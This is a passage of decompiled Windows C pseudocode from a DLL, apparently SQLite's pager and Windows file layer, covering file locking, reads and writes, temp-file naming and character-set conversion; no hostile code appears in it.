        sub_10059C70((_BYTE *)(*(_DWORD *)v4 + 24), v5 + 1);
        *(_BYTE *)(a1 + 18) = 1;
      }
    }
    sub_1006EC75(v4);
  }
  return v2;
}

//----- (1006F1F2) --------------------------------------------------------
int __usercall sub_1006F1F2@<eax>(int a1@<eax>, char *a2, int a3)
{
  int result; // eax
  int v5; // ebx
  int i; // esi
  unsigned int v7; // edi
  unsigned int v8; // ecx
  int v9; // eax
  int v10; // ebx
  unsigned int v11; // edi
  int *v12; // ecx
  int j; // eax
  int v14; // edx
  int v15; // eax
  _DWORD **k; // edi
  int v17; // ecx
  unsigned int v18; // [esp+Ch] [ebp-Ch]
  int v19; // [esp+10h] [ebp-8h]
  int v20; // [esp+14h] [ebp-4h] BYREF

  result = *(_DWORD *)(a1 + 36);
  v5 = 0;
  if ( !result )
  {
    if ( *(_BYTE *)(a1 + 13) && *(_BYTE *)(a1 + 15) )
    {
      for ( i = *(_DWORD *)(a1 + 172); i; i = *(_DWORD *)(i + 44) )
        *(_DWORD *)(i + 16) = 1;
    }
    else if ( *(_BYTE *)(a1 + 14) != 5 && *(_BYTE *)(a1 + 15) )
    {
      v5 = *(_BYTE *)(a1 + 18) ? 0 : sub_1006F196(a1);
      if ( !v5 )
      {
        v7 = *(_DWORD *)(a1 + 24);
        v8 = *(_DWORD *)(a1 + 28);
        v18 = v7;
        if ( v7 < v8 && *(_BYTE *)(a1 + 5) != 2 )
        {
          v9 = 0x40000000 / *(_DWORD *)(a1 + 124);
          *(_DWORD *)(a1 + 24) = v8;
          v10 = v9 + 1;
          v11 = v7 + 1;
          v19 = v9 + 1;
          if ( v11 <= v8 )
          {
            do
            {
              if ( !sub_10070BFA(v11, *(unsigned int **)(a1 + 52)) && v11 != v10 )
              {
                if ( !v11 )
                  return 11;
                v5 = sub_1006EB74(a1, v11, &v20, 0);
                if ( v5 )
                  return v5;
                v5 = sub_1006EFC8(v20);
                sub_1006EC75(v20);
                if ( v5 )
                  return v5;
                v10 = v19;
              }
              ++v11;
            }
            while ( v11 <= *(_DWORD *)(a1 + 28) );
          }
          *(_DWORD *)(a1 + 24) = v18;
        }
        v5 = sub_1006D1B6(a1, a2);
        if ( !v5 )
        {
          v5 = sub_1006E128(a1);
          if ( !v5 )
          {
            v12 = *(int **)(a1 + 168);
            for ( j = *v12; j; j = v14 )
            {
              v14 = *(_DWORD *)(j + 28);
              *(_DWORD *)(j + 8) = v14;
            }
            v15 = sub_1006944A(*v12);
            v5 = sub_1006E26C(v15);
            if ( !v5 )
            {
              for ( k = *(_DWORD ***)(a1 + 168); *k; sub_10069369(*k) )
                ;
              v17 = *(_DWORD *)(a1 + 24);
              if ( v17 == *(_DWORD *)(a1 + 32)
                || (v5 = sub_1006D9E3(a1, v17 - (v17 == 0x40000000 / *(_DWORD *)(a1 + 124) + 1))) == 0 )
              {
                if ( !*(_BYTE *)(a1 + 8) && !a3 )
                  v5 = sub_10067447(*(_DWORD *)(a1 + 56), *(unsigned __int8 *)(a1 + 10));
                *(_BYTE *)(a1 + 14) = 5;
              }
            }
          }
        }
      }
    }
    return v5;
  }
  return result;
}

//----- (1006F395) --------------------------------------------------------
int __usercall sub_1006F395@<eax>(int a1@<esi>)
{
  int result; // eax
  int v2; // eax

  result = *(_DWORD *)(a1 + 36);
  if ( !result )
  {
    if ( *(_BYTE *)(a1 + 14) >= 2u )
    {
      if ( !*(_BYTE *)(a1 + 15) && *(_BYTE *)(a1 + 4) && *(_BYTE *)(a1 + 5) == 1 )
      {
        return 0;
      }
      else
      {
        v2 = sub_1006D4A7((_DWORD *)a1, *(unsigned __int8 *)(a1 + 19));
        return sub_1006D466(v2, a1);
      }
    }
    else
    {
      return 1;
    }
  }
  return result;
}

//----- (1006F3D2) --------------------------------------------------------
int __usercall sub_1006F3D2@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v4; // esi
  int v5; // eax

  if ( !*(_BYTE *)(a1 + 15) || !**(_DWORD **)(a1 + 60) )
    return sub_1006D4A7((_DWORD *)a1, *(unsigned __int8 *)(a1 + 19));
  v2 = *(_DWORD *)(a1 + 36);
  if ( v2 && v2 != 13 )
  {
    if ( *(_BYTE *)(a1 + 14) >= 4u )
      sub_1006DAA3((unsigned int *)a1, 0);
    return *(_DWORD *)(a1 + 36);
  }
  if ( *(_BYTE *)(a1 + 14) != 2 )
  {
    v5 = sub_1006DAA3((unsigned int *)a1, 0);
LABEL_12:
    v4 = v5;
    goto LABEL_13;
  }
  v4 = sub_1006DAA3((unsigned int *)a1, 0);
  v5 = sub_1006D4A7((_DWORD *)a1, *(unsigned __int8 *)(a1 + 19));
  if ( !v4 )
    goto LABEL_12;
LABEL_13:
  if ( !*(_BYTE *)(a1 + 13) )
    *(_BYTE *)(a1 + 21) = 0;
  return sub_1006D466(v4, a1);
}

//----- (1006F459) --------------------------------------------------------
int __usercall sub_1006F459@<eax>(int a1@<esi>, int a2)
{
  int v2; // edi
  int result; // eax
  int v4; // ebx
  _DWORD *i; // ebx
  unsigned int v6; // ecx
  unsigned int v7; // eax
  _DWORD *v8; // eax

  v2 = *(_DWORD *)(a1 + 92);
  result = 0;
  if ( a2 > v2 && *(_BYTE *)(a1 + 6) )
  {
    v4 = sub_10058EFA(32 * a2, *(_DWORD *)(a1 + 88));
    if ( !v4 )
      return 7;
    memset((void *)(v4 + 32 * v2), 0, 32 * (a2 - v2));
    *(_DWORD *)(a1 + 88) = v4;
    *(_DWORD *)(a1 + 92) = a2;
    if ( v2 < a2 )
    {
      for ( i = (_DWORD *)(v4 + 32 * v2 + 24); ; i += 8 )
      {
        *(i - 1) = *(_DWORD *)(a1 + 24);
        if ( **(_DWORD **)(a1 + 60) && (v6 = *(_DWORD *)(a1 + 76), v7 = *(_DWORD *)(a1 + 72), __SPAIR64__(v6, v7) > 0) )
        {
          *(i - 5) = v6;
        }
        else
        {
          v7 = *(_DWORD *)(a1 + 112);
          *(i - 5) = 0;
        }
        *(i - 6) = v7;
        *i = *(_DWORD *)(a1 + 48);
        v8 = sub_10070BE1(*(_DWORD *)(a1 + 24));
        *(i - 2) = v8;
        if ( !v8 )
          break;
        if ( ++v2 >= a2 )
          return sub_1006EC95(a1);
      }
      return 7;
    }
    return sub_1006EC95(a1);
  }
  return result;
}

//----- (1006F519) --------------------------------------------------------
int __usercall sub_1006F519@<eax>(int a1@<esi>, int a2, int a3)
{
  int v3; // eax
  int v4; // edi
  int v5; // ebx
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v8; // eax
  int v10; // [esp+Ch] [ebp-4h]
  int v11; // [esp+1Ch] [ebp+Ch]

  v3 = *(_DWORD *)(a1 + 92);
  v10 = 0;
  if ( a3 < v3 )
  {
    v11 = a3 + (a2 == 2);
    v4 = v11;
    if ( v11 < v3 )
    {
      v5 = 32 * v11;
      do
      {
        sub_10070E6B(*(_DWORD *)(*(_DWORD *)(a1 + 88) + v5 + 16));
        ++v11;
        v5 += 32;
      }
      while ( v11 < *(_DWORD *)(a1 + 92) );
    }
    *(_DWORD *)(a1 + 92) = v4;
    if ( a2 == 2 )
    {
      v6 = 0;
      if ( **(_DWORD **)(a1 + 60) )
      {
        if ( v4 )
          v6 = (_DWORD *)(*(_DWORD *)(a1 + 88) + 32 * v4 - 32);
        v10 = sub_1006DCF2((_DWORD *)a1, v6);
      }
    }
    if ( !v4 && a2 == 1 )
    {
      v7 = *(_DWORD **)(a1 + 64);
      if ( *v7 )
      {
        v8 = sub_10067433((int)v7, 0, 0);
        *(_DWORD *)(a1 + 48) = 0;
        return v8;
      }
    }
  }
  return v10;
}

//----- (1006F5BD) --------------------------------------------------------
int __usercall sub_1006F5BD@<eax>(int a1@<eax>, int a2, int a3, int a4)
{
  int v4; // esi
  int result; // eax
  __int16 v7; // ax
  int v8; // eax
  int v9; // ebx
  int v10; // edi
  int v11; // ecx
  int v12; // ecx
  int v13; // [esp-4h] [ebp-20h]
  int v14; // [esp+10h] [ebp-Ch]
  int v15; // [esp+14h] [ebp-8h]
  unsigned int v16; // [esp+18h] [ebp-4h]

  v16 = 0;
  v4 = a2;
  if ( (!*(_BYTE *)(a2 + 13) || (result = sub_1006EFC8(a1)) == 0)
    && ((*(_BYTE *)(a1 + 20) & 2) == 0 || !sub_1006CC49(a1) || (result = sub_1006E342((int *)a1)) == 0) )
  {
    v7 = *(_WORD *)(a1 + 20);
    if ( (v7 & 4) != 0 && !a4 )
      v16 = *(_DWORD *)(a1 + 12);
    v13 = a3;
    *(_WORD *)(a1 + 20) = v7 & 0xFFFB;
    v8 = sub_1006D326(v4, v13);
    v14 = v8;
    if ( v8 )
    {
      *(_WORD *)(a1 + 20) |= *(_BYTE *)(v8 + 20) & 4;
      if ( *(_BYTE *)(v4 + 13) )
        sub_10069389(*(_DWORD *)(v4 + 24) + 1, v8);
      else
        sub_10069323((_DWORD *)v8);
    }
    v15 = *(_DWORD *)(a1 + 12);
    sub_10069389(a3, a1);
    sub_1006934E(a1);
    v9 = a2;
    *(_BYTE *)(a2 + 15) = 1;
    if ( v16 )
    {
      v10 = sub_1006EB74(v9, v16, &a2, 0);
      if ( v10 )
      {
        if ( v16 <= *(_DWORD *)(v9 + 28) )
          sub_10070DAA(*(_DWORD *)(v9 + 52), v16, *(char **)(v9 + 152));
        return v10;
      }
      v11 = a2;
      *(_BYTE *)(v9 + 16) = 1;
      *(_WORD *)(v11 + 20) |= 4u;
      sub_1006934E(v11);
      sub_1006EC75(v12);
    }
    if ( *(_BYTE *)(v9 + 13) )
    {
      sub_10069389(v15, v14);
      sub_1006EC75(v14);
    }
    return 0;
  }
  return result;
}
// 1006F6BA: variable 'v12' is possibly undefined

//----- (1006F6DE) --------------------------------------------------------
int __usercall sub_1006F6DE@<eax>(int a1@<ebx>, int a2@<edi>)
{
  _DWORD *v2; // esi

  if ( a1 >= 0 && (!*(_BYTE *)(a2 + 13) || a1 == 4 || a1 == 2) && !*(_BYTE *)(a2 + 15) )
  {
    v2 = *(_DWORD **)(a2 + 60);
    if ( !*v2 )
    {
LABEL_11:
      *(_BYTE *)(a2 + 5) = a1;
      return *(unsigned __int8 *)(a2 + 5);
    }
    if ( !*(_DWORD *)(a2 + 72) && !*(_DWORD *)(a2 + 76) )
    {
      if ( *v2 )
        sub_100673EE((int)v2);
      goto LABEL_11;
    }
  }
  return *(unsigned __int8 *)(a2 + 5);
}

//----- (1006F71E) --------------------------------------------------------
BOOL sub_1006F71E()
{
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-94h] BYREF

  if ( !dword_1018643C )
  {
    VersionInformation.dwOSVersionInfoSize = 148;
    GetVersionExA(&VersionInformation);
    dword_1018643C = (VersionInformation.dwPlatformId == 2) + 1;
  }
  return dword_1018643C == 2;
}
// 1018643C: using guessed type int dword_1018643C;

//----- (1006F767) --------------------------------------------------------
WCHAR *__cdecl sub_1006F767(LPCCH lpMultiByteStr)
{
  int v1; // ebx
  WCHAR *result; // eax
  WCHAR *Block; // [esp+Ch] [ebp-4h]

  v1 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0, 0);
  result = (WCHAR *)malloc(2 * v1);
  Block = result;
  if ( result )
  {
    if ( !MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, result, v1) )
    {
      free(Block);
      return 0;
    }
    return Block;
  }
  return result;
}

//----- (1006F7BE) --------------------------------------------------------
CHAR *__cdecl sub_1006F7BE(LPCWCH lpWideCharStr)
{
  CHAR *v1; // eax
  int cbMultiByte; // [esp+Ch] [ebp-8h]
  CHAR *Block; // [esp+10h] [ebp-4h]

  cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, 0, 0, 0, 0);
  v1 = (CHAR *)malloc(cbMultiByte);
  Block = v1;
  if ( !v1 )
    return 0;
  if ( !WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, v1, cbMultiByte, 0, 0) )
  {
    free(Block);
    return 0;
  }
  return Block;
}

//----- (1006F81C) --------------------------------------------------------
CHAR *__cdecl sub_1006F81C(LPCWCH lpWideCharStr)
{
  BOOL v1; // esi
  CHAR *v2; // eax
  int cbMultiByte; // [esp+Ch] [ebp-8h]
  CHAR *Block; // [esp+10h] [ebp-4h]

  v1 = !AreFileApisANSI();
  cbMultiByte = WideCharToMultiByte(v1, 0, lpWideCharStr, -1, 0, 0, 0, 0);
  v2 = (CHAR *)malloc(cbMultiByte);
  Block = v2;
  if ( !v2 )
    return 0;
  if ( !WideCharToMultiByte(v1, 0, lpWideCharStr, -1, v2, cbMultiByte, 0, 0) )
  {
    free(Block);
    return 0;
  }
  return Block;
}

//----- (1006F882) --------------------------------------------------------
CHAR *__cdecl sub_1006F882(LPCCH lpMultiByteStr)
{
  BOOL v1; // esi
  int v2; // eax
  int v3; // edi
  WCHAR *v4; // eax
  WCHAR *v5; // esi
  CHAR *v7; // edi
  WCHAR *Block; // [esp+Ch] [ebp-4h]

  v1 = !AreFileApisANSI();
  v2 = MultiByteToWideChar(v1, 0, lpMultiByteStr, -1, 0, 0);
  v3 = 2 * v2;
  v4 = (WCHAR *)malloc(4 * v2);
  Block = v4;
  if ( !v4 )
    return 0;
  if ( MultiByteToWideChar(v1, 0, lpMultiByteStr, -1, v4, v3) )
  {
    v5 = Block;
  }
  else
  {
    free(Block);
    v5 = 0;
  }
  if ( !v5 )
    return 0;
  v7 = sub_1006F7BE(v5);
  free(v5);
  return v7;
}

//----- (1006F8FD) --------------------------------------------------------
int __cdecl sub_1006F8FD(int a1)
{
  int v1; // ebx
  BOOL v2; // eax

  v1 = 0;
  while ( 1 )
  {
    v2 = CloseHandle(*(HANDLE *)(a1 + 4));
    if ( v2 )
      break;
    if ( ++v1 >= 3 )
      break;
    Sleep(0x64u);
  }
  return v2 ? 0 : 10;
}

//----- (1006F936) --------------------------------------------------------
int __cdecl sub_1006F936(
        DWORD NumberOfBytesRead,
        char *lpBuffer,
        DWORD nNumberOfBytesToRead,
        LONG lDistanceToMove,
        int a5)
{
  DWORD v5; // edi
  DWORD LastError; // eax
  DWORD v8; // esi
  LONG DistanceToMoveHigh; // [esp+8h] [ebp-4h] BYREF

  v5 = NumberOfBytesRead;
  DistanceToMoveHigh = a5 & 0x7FFFFFFF;
  if ( SetFilePointer(*(HANDLE *)(NumberOfBytesRead + 4), lDistanceToMove, &DistanceToMoveHigh, 0) == -1
    && (LastError = GetLastError()) != 0 )
  {
    *(_DWORD *)(v5 + 12) = LastError;
    return 13;
  }
  else
  {
    v8 = nNumberOfBytesToRead;
    if ( ReadFile(*(HANDLE *)(v5 + 4), lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    {
      if ( NumberOfBytesRead == v8 )
      {
        return 0;
      }
      else
      {
        memset(&lpBuffer[NumberOfBytesRead], 0, v8 - NumberOfBytesRead);
        return 522;
      }
    }
    else
    {
      *(_DWORD *)(v5 + 12) = GetLastError();
      return 266;
    }
  }
}

//----- (1006F9C9) --------------------------------------------------------
int __cdecl sub_1006F9C9(int a1, char *lpBuffer, int nNumberOfBytesToWrite, LONG lDistanceToMove, int a5)
{
  DWORD v5; // ebx
  DWORD LastError; // eax
  void *v8; // [esp-10h] [ebp-24h]
  LONG DistanceToMoveHigh; // [esp+Ch] [ebp-8h] BYREF
  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-4h] BYREF

  DistanceToMoveHigh = a5 & 0x7FFFFFFF;
  v8 = *(void **)(a1 + 4);
  NumberOfBytesWritten = 0;
  v5 = SetFilePointer(v8, lDistanceToMove, &DistanceToMoveHigh, 0);
  if ( v5 != -1 || (LastError = GetLastError()) == 0 )
  {
    while ( nNumberOfBytesToWrite > 0 )
    {
      v5 = WriteFile(*(HANDLE *)(a1 + 4), lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
      if ( !v5 )
        goto LABEL_11;
      if ( !NumberOfBytesWritten )
        break;
      nNumberOfBytesToWrite -= NumberOfBytesWritten;
      lpBuffer += NumberOfBytesWritten;
    }
    if ( v5 && nNumberOfBytesToWrite <= (int)NumberOfBytesWritten )
      return 0;
LABEL_11:
    LastError = GetLastError();
  }
  *(_DWORD *)(a1 + 12) = LastError;
  return 13;
}

//----- (1006FA5A) --------------------------------------------------------
int __cdecl sub_1006FA5A(int a1, LONG lDistanceToMove, int a3)
{
  DWORD LastError; // eax
  LONG DistanceToMoveHigh; // [esp+8h] [ebp-4h] BYREF

  DistanceToMoveHigh = a3 & 0x7FFFFFFF;
  if ( SetFilePointer(*(HANDLE *)(a1 + 4), lDistanceToMove, &DistanceToMoveHigh, 0) == -1 )
  {
    LastError = GetLastError();
    if ( LastError )
      goto LABEL_3;
  }
  if ( !SetEndOfFile(*(HANDLE *)(a1 + 4)) )
  {
    LastError = GetLastError();
LABEL_3:
    *(_DWORD *)(a1 + 12) = LastError;
    return 1546;
  }
  return 0;
}

//----- (1006FAB7) --------------------------------------------------------
int __cdecl sub_1006FAB7(int a1)
{
  if ( FlushFileBuffers(*(HANDLE *)(a1 + 4)) )
    return 0;
  *(_DWORD *)(a1 + 12) = GetLastError();
  return 10;
}

//----- (1006FADE) --------------------------------------------------------
int __cdecl sub_1006FADE(DWORD FileSizeHigh, _QWORD *a2)
{
  DWORD v2; // esi
  DWORD FileSize; // edi
  DWORD LastError; // eax

  v2 = FileSizeHigh;
  FileSize = GetFileSize(*(HANDLE *)(FileSizeHigh + 4), &FileSizeHigh);
  if ( FileSize == -1 && (LastError = GetLastError()) != 0 )
  {
    *(_DWORD *)(v2 + 12) = LastError;
    return 1802;
  }
  else
  {
    *a2 = FileSize + ((unsigned __int64)FileSizeHigh << 32);
    return 0;
  }
}

//----- (1006FB32) --------------------------------------------------------
BOOL __usercall sub_1006FB32@<eax>(int a1@<esi>)
{
  BOOL v1; // eax
  int v2; // edx
  BOOL v3; // ebx
  void *v5; // [esp-18h] [ebp-34h]
  void *v6; // [esp-14h] [ebp-30h]
  struct _OVERLAPPED Overlapped; // [esp+4h] [ebp-18h] BYREF
  int v8; // [esp+18h] [ebp-4h] BYREF

  if ( sub_1006F71E() )
  {
    Overlapped.hEvent = 0;
    v5 = *(void **)(a1 + 4);
    Overlapped.8 = (union _OVERLAPPED::$742A73540840F318F86F9CEE3D494648)1073741826i64;
    v1 = LockFileEx(v5, 1u, 0, 0x1FEu, 0, &Overlapped);
  }
  else
  {
    sub_10069AB6((char *)&v8, 4);
    v2 = (v8 & 0x7FFFFFFF) % 509;
    v6 = *(void **)(a1 + 4);
    *(_WORD *)(a1 + 10) = v2;
    v1 = LockFile(v6, (__int16)v2 + 1073741826, 0, 1u, 0);
  }
  v3 = v1;
  if ( !v1 )
    *(_DWORD *)(a1 + 12) = GetLastError();
  return v3;
}

//----- (1006FBB6) --------------------------------------------------------
BOOL __usercall sub_1006FBB6@<eax>(int a1@<esi>)
{
  BOOL v1; // eax
  BOOL v2; // edi

  if ( sub_1006F71E() )
    v1 = UnlockFile(*(HANDLE *)(a1 + 4), 0x40000002u, 0, 0x1FEu, 0);
  else
    v1 = UnlockFile(*(HANDLE *)(a1 + 4), *(__int16 *)(a1 + 10) + 1073741826, 0, 1u, 0);
  v2 = v1;
  if ( !v1 )
    *(_DWORD *)(a1 + 12) = GetLastError();
  return v2;
}

//----- (1006FBFA) --------------------------------------------------------
int __cdecl sub_1006FBFA(int a1, int a2)
{
  unsigned __int8 v3; // al
  BOOL v4; // ebx
  int result; // eax
  BOOL v6; // [esp+8h] [ebp-8h]
  int v7; // [esp+8h] [ebp-8h]
  DWORD LastError; // [esp+Ch] [ebp-4h]
  char v9; // [esp+18h] [ebp+8h]

  v6 = 0;
  LastError = 0;
  v3 = *(_BYTE *)(a1 + 8);
  v4 = 1;
  if ( v3 >= a2 )
    return 0;
  v9 = *(_BYTE *)(a1 + 8);
  if ( v3 )
  {
    if ( a2 != 4 )
      goto LABEL_11;
    if ( v3 != 2 )
      goto LABEL_23;
  }
  v7 = 3;
  do
  {
    --v7;
    v4 = LockFile(*(HANDLE *)(a1 + 4), 0x40000000u, 0, 1u, 0);
    if ( v4 )
      break;
    Sleep(1u);
  }
  while ( v7 > 0 );
  v6 = v4;
  if ( !v4 )
    LastError = GetLastError();
LABEL_11:
  if ( a2 == 1 )
  {
    if ( !v4 )
      goto LABEL_26;
    v4 = sub_1006FB32(a1);
    if ( v4 )
    {
      v9 = 1;
      goto LABEL_26;
    }
    LastError = GetLastError();
  }
  if ( a2 == 2 )
  {
    if ( !v4 )
      goto LABEL_26;
    v4 = LockFile(*(HANDLE *)(a1 + 4), 0x40000001u, 0, 1u, 0);
    if ( v4 )
    {
      v9 = 2;
      goto LABEL_26;
    }
    LastError = GetLastError();
  }
  if ( a2 != 4 || !v4 )
  {
LABEL_26:
    if ( v6 && a2 == 1 )
      UnlockFile(*(HANDLE *)(a1 + 4), 0x40000000u, 0, 1u, 0);
    goto LABEL_29;
  }
LABEL_23:
  v6 = 0;
  v9 = 3;
  sub_1006FBB6(a1);
  v4 = LockFile(*(HANDLE *)(a1 + 4), 0x40000002u, 0, 0x1FEu, 0);
  if ( !v4 )
  {
    LastError = GetLastError();
    sub_1006FB32(a1);
    goto LABEL_26;
  }
  v9 = 4;
LABEL_29:
  if ( v4 )
  {
    result = 0;
  }
  else
  {
    *(_DWORD *)(a1 + 12) = LastError;
    result = 5;
  }
  *(_BYTE *)(a1 + 8) = v9;
  return result;
}

//----- (1006FD5F) --------------------------------------------------------
int __cdecl sub_1006FD5F(int a1, BOOL *a2)
{
  BOOL v3; // eax
  BOOL v5; // [esp+Ch] [ebp+8h]

  if ( *(_BYTE *)(a1 + 8) < 2u )
  {
    v5 = LockFile(*(HANDLE *)(a1 + 4), 0x40000001u, 0, 1u, 0);
    if ( v5 )
      UnlockFile(*(HANDLE *)(a1 + 4), 0x40000001u, 0, 1u, 0);
    v3 = !v5;
  }
  else
  {
    v3 = 1;
  }
  *a2 = v3;
  return 0;
}

//----- (1006FDB1) --------------------------------------------------------
int __cdecl sub_1006FDB1(int a1, int a2)
{
  int v3; // eax
  int v5; // [esp+Ch] [ebp-4h]
  int v6; // [esp+18h] [ebp+8h]

  v3 = *(unsigned __int8 *)(a1 + 8);
  v5 = 0;
  v6 = v3;
  if ( v3 >= 4 )
  {
    UnlockFile(*(HANDLE *)(a1 + 4), 0x40000002u, 0, 0x1FEu, 0);
    if ( a2 == 1 && !sub_1006FB32(a1) )
      v5 = 2058;
  }
  if ( v6 >= 2 )
    UnlockFile(*(HANDLE *)(a1 + 4), 0x40000001u, 0, 1u, 0);
  if ( !a2 && v6 >= 1 )
    sub_1006FBB6(a1);
  if ( v6 >= 3 )
    UnlockFile(*(HANDLE *)(a1 + 4), 0x40000000u, 0, 1u, 0);
  *(_BYTE *)(a1 + 8) = a2;
  return v5;
}

//----- (1006FE3F) --------------------------------------------------------
int __cdecl sub_1006FE3F(int a1, int a2, _DWORD *a3)
{
  int v4; // eax

  if ( a2 == 1 )
  {
    v4 = *(unsigned __int8 *)(a1 + 8);
  }
  else
  {
    if ( a2 != 4 )
      return 1;
    v4 = *(_DWORD *)(a1 + 12);
  }
  *a3 = v4;
  return 0;
}

//----- (1006FE75) --------------------------------------------------------
const WCHAR *__cdecl sub_1006FE75(LPCCH lpMultiByteStr)
{
  const WCHAR *result; // eax
  WCHAR *v2; // esi
  CHAR *v3; // edi

  if ( sub_1006F71E() )
    return sub_1006F767(lpMultiByteStr);
  result = sub_1006F767(lpMultiByteStr);
  v2 = (WCHAR *)result;
  if ( result )
  {
    v3 = sub_1006F81C(result);
    free(v2);
    return (const WCHAR *)v3;
  }
  return result;
}

//----- (1006FEAE) --------------------------------------------------------
int __usercall sub_1006FEAE@<eax>(_BYTE *a1@<edi>)
{
  CHAR *v1; // eax
  CHAR *v2; // ebx
  CHAR *v3; // eax
  _BYTE *v4; // eax
  int v5; // ecx
  int v6; // ecx
  _BYTE *v7; // esi
  int v8; // ecx
  WCHAR Buffer[128]; // [esp+8h] [ebp-310h] BYREF
  CHAR MultiByteStr[264]; // [esp+108h] [ebp-210h] BYREF
  char v12[264]; // [esp+210h] [ebp-108h] BYREF

  if ( !dword_101863F0 )
  {
    if ( sub_1006F71E() )
    {
      GetTempPathW(0xE6u, Buffer);
      v1 = sub_1006F7BE(Buffer);
      v2 = v1;
      if ( v1 )
      {
        sub_10055543(230, (int)v12, aS_19, v1);
LABEL_8:
        free(v2);
        goto LABEL_9;
      }
    }
    else
    {
      GetTempPathA(0xE6u, MultiByteStr);
      v3 = sub_1006F882(MultiByteStr);
      v2 = v3;
      if ( v3 )
      {
        sub_10055543(230, (int)v12, aS_20, v3);
        goto LABEL_8;
      }
    }
    return 7;
  }
  sub_10055543(230, (int)v12, "%s", (const char *)dword_101863F0);
LABEL_9:
  v4 = sub_10059297(v12);
  if ( v4 )
  {
    v6 = v5 - 1;
    do
    {
      if ( v4[v6] != 92 )
        break;
      --v4;
    }
    while ( v4 );
  }
  v12[(_DWORD)v4] = 0;
  sub_10055543(231, (int)a1, "%s\\etilqs_", v12);
  v7 = sub_10059297(a1);
  sub_10069AB6(&a1[(_DWORD)v7], 20);
  v8 = 20;
  do
  {
    a1[(_DWORD)v7] = byte_10180B40[(unsigned __int8)a1[(_DWORD)v7] % 0x3Eu];
    ++v7;
    --v8;
  }
  while ( v8 );
  a1[(_DWORD)v7] = 0;
  return 0;
}
// 1006FF67: variable 'v5' is possibly undefined
// 101863F0: using guessed type int dword_101863F0;
// 1006FEAE: using guessed type char var_108[264];

//----- (1006FFD0) --------------------------------------------------------
int __cdecl sub_1006FFD0(int a1, int a2)
{
  DWORD LastError; // edi
  DWORD v3; // ebx
  bool v4; // zf
  CHAR *v5; // eax
  CHAR *v7; // [esp-4h] [ebp-1Ch]
  CHAR v8[4]; // [esp+Ch] [ebp-Ch] BYREF
  WCHAR Buffer[2]; // [esp+10h] [ebp-8h] BYREF
  void *Block; // [esp+14h] [ebp-4h]

  LastError = GetLastError();
  Block = 0;
  if ( sub_1006F71E() )
  {
    *(_DWORD *)Buffer = 0;
    v3 = FormatMessageW(0x1300u, 0, LastError, 0, Buffer, 0, 0);
    v4 = v3 == 0;
    if ( !v3 )
      goto LABEL_7;
    v5 = sub_1006F7BE(*(LPCWCH *)Buffer);
    v7 = *(CHAR **)Buffer;
  }
  else
  {
    *(_DWORD *)v8 = 0;
    v3 = FormatMessageA(0x1300u, 0, LastError, 0, v8, 0, 0);
    v4 = v3 == 0;
    if ( !v3 )
      goto LABEL_7;
    v5 = sub_1006F882(*(LPCCH *)v8);
    v7 = *(CHAR **)v8;
  }
  Block = v5;
  LocalFree(v7);
  v4 = v3 == 0;
LABEL_7:
  if ( v4 )
  {
    sub_10055543(a1, a2, "OsError 0x%x (%u)", LastError, LastError);
  }
  else
  {
    sub_10055543(a1, a2, "%s", (const char *)Block);
    free(Block);
  }
  return 0;
}

//----- (10070081) --------------------------------------------------------
int __cdecl sub_10070081(int a1, const CHAR *a2, _DWORD *a3, int a4, _DWORD *a5)
{
  int result; // eax
  DWORD v6; // esi
  DWORD v7; // edi
  HANDLE FileW; // eax
  HANDLE v9; // edi
  DWORD v10; // [esp-8h] [ebp-130h]
  WCHAR *lpFileName; // [esp+10h] [ebp-118h]
  const CHAR *lpMultiByteStr; // [esp+14h] [ebp-114h]
  int v14; // [esp+1Ch] [ebp-10Ch]
  char v15[264]; // [esp+20h] [ebp-108h] BYREF

  lpMultiByteStr = a2;
  if ( !a2 )
  {
    result = sub_1006FEAE(v15);
    if ( result )
      return result;
    lpMultiByteStr = v15;
  }
  lpFileName = (WCHAR *)sub_1006FE75(lpMultiByteStr);
  if ( !lpFileName )
    return 7;
  v14 = a4 & 2;
  v6 = v14 != 0 ? -1073741824 : 0x80000000;
  if ( (a4 & 0x10) != 0 )
    v7 = 1;
  else
    v7 = ((a4 & 4) != 0) + 3;
  v10 = (a4 & 8) != 0 ? 67109122 : 128;
  if ( sub_1006F71E() )
    FileW = CreateFileW(lpFileName, v6, 3u, 0, v7, v10, 0);
  else
    FileW = CreateFileA((LPCSTR)lpFileName, v6, 3u, 0, v7, v10, 0);
  v9 = FileW;
  if ( FileW == (HANDLE)-1 )
  {
    free(lpFileName);
    if ( (a4 & 2) == 0 )
      return 14;
    return sub_10070081(a1, (int)a2, a3, a4 & 0xFFFFFFFC | 1, (int)a5);
  }
  else
  {
    if ( a5 )
      *a5 = (v14 != 0) + 1;
    memset(a3, 0, 0x14u);
    *a3 = &unk_100FE61C;
    a3[1] = v9;
    a3[3] = 0;
    a3[4] = sub_100703C0(a1, lpMultiByteStr);
    free(lpFileName);
    return 0;
  }
}

//----- (100701CC) --------------------------------------------------------
int __cdecl sub_100701CC(int a1, LPCCH lpMultiByteStr)
{
  DWORD LastError; // ebx
  WCHAR *v3; // edi
  DWORD FileAttributesW; // esi
  int v6; // [esp+8h] [ebp-4h]

  LastError = 0;
  v6 = 0;
  v3 = (WCHAR *)sub_1006FE75(lpMultiByteStr);
  if ( !v3 )
    return 7;
  if ( sub_1006F71E() )
  {
    while ( 1 )
    {
      DeleteFileW(v3);
      FileAttributesW = GetFileAttributesW(v3);
      if ( FileAttributesW == -1 )
      {
        LastError = GetLastError();
        if ( LastError != 5 )
          break;
      }
      if ( ++v6 >= 5 )
        break;
      Sleep(0x64u);
    }
  }
  else
  {
    while ( 1 )
    {
      DeleteFileA((LPCSTR)v3);
      FileAttributesW = GetFileAttributesA((LPCSTR)v3);
      if ( FileAttributesW == -1 )
      {
        LastError = GetLastError();
        if ( LastError != 5 )
          break;
      }
      if ( ++v6 >= 5 )
        break;
      Sleep(0x64u);
    }
  }
  free(v3);
  if ( FileAttributesW == -1 && LastError == 2 )
    return 0;
  else
    return 2570;
}

